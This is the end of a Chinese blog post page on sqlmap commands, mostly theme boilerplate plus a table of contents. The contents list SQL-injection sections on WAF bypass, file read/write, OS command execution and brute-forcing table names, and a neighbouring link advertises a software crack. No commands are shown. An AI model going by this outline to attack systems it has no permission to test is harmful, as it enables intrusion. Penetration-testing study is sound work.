+使用多个插件，逗号分隔</code></pre><hr></div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">madcoding</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.mad-coding.cn/2020/02/08/sqlmap命令集合/">https://www.mad-coding.cn/2020/02/08/sqlmap命令集合/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.mad-coding.cn">madcoding’s blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-buttom"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/wechat.jpg"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/alipay.jpg"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull-left"><a href="/2020/02/10/AppScan-Standard-9-0-3-14安装破解/"><img class="prev_cover lozad" data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20200210190437.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>AppScan Standard-9.0.3.14安装破解</span></div></a></div><div class="next-post pull-right"><a href="/2020/02/06/python学习-python基础知识/"><img class="next_cover lozad" data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>python学习--&gt;python基础知识</span></div></a></div></nav><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'G4KVNWBtXJxgbEwcA9QMJGVo-gzGzoHsz',
+  appKey:'E8XbTUIA04PSPKW9rGpkjYg3',
+  placeholder:'Please leave your footprints',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang:'en',
+  recordIP: true
+});</script></div></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By madcoding</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi，welcome to madcoding's <a href="https://www.mad-coding.cn/">blog</a></div><div class="icp"><a href="http://www.beian.miit.gov.cn/state/outPortal/loginPortal.action"><span>皖ICP备17023740号</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><section class="rightside" id="rightside"><i class="fa fa-book" id="readmode" title="阅读模式"> </i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="fa fa-moon-o nightshift" id="nightshift" title="夜间模式"></i></section><div id="post_bottom"><div id="post_bottom_items"><a id="to_comment" href="#post-comment"><i class="scroll_to_comment fa fa-comments"></i></a><i class="fa fa-list" id="mobile_toc"></i><div id="toc_mobile"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x00-前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">0x00 前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x01-基本命令"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">0x01 基本命令</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x02-参数：–level"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">0x02 参数：–level</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x03-显示调试信息"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">0x03 显示调试信息</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x04-风险等级"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">0x04 风险等级</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x05-取目标"><span class="toc_mobile_items-number">6.</span> <span class="toc_mobile_items-text">0x05 取目标</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x06-从文本中获取多个目标"><span class="toc_mobile_items-number">7.</span> <span class="toc_mobile_items-text">0x06 从文本中获取多个目标</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x07-获取http请求注入（用请求包注入）"><span class="toc_mobile_items-number">8.</span> <span class="toc_mobile_items-text">0x07 获取http请求注入（用请求包注入）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x08-处理Google搜索结果（需要挂代理）"><span class="toc_mobile_items-number">9.</span> <span class="toc_mobile_items-text">0x08 处理Google搜索结果（需要挂代理）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x09-各种参数"><span class="toc_mobile_items-number">10.</span> <span class="toc_mobile_items-text">0x09 各种参数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x10-注册表操作（不建议改，容易改崩）"><span class="toc_mobile_items-number">11.</span> <span class="toc_mobile_items-text">0x10 注册表操作（不建议改，容易改崩）</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x11-暴力破解表名"><span class="toc_mobile_items-number">12.</span> <span class="toc_mobile_items-text">0x11 暴力破解表名</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x12-文件读写"><span class="toc_mobile_items-number">13.</span> <span class="toc_mobile_items-text">0x12 文件读写</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x13-命令执行"><span class="toc_mobile_items-number">14.</span> <span class="toc_mobile_items-text">0x13 命令执行</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#0x14-WAF绕过注入"><span class="toc_mobile_items-number">15.</span> <span class="toc_mobile_items-text">0x14 WAF绕过注入</span></a></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script async src="/js/search/local-search.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script src="/js/nightshift.js"></script><script id="ribbon" src="/js/third-party/canvas-ribbon.js" size="150" alpha="0.6" zindex="-1" data-click="false"></script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
+POWERMODE.shake = true; // turn off shake
+document.body.addEventListener('input', POWERMODE);
+</script><script src="/js/tw_cn.js"></script><script>translateInitilization()
+
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
+observer.observe();</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
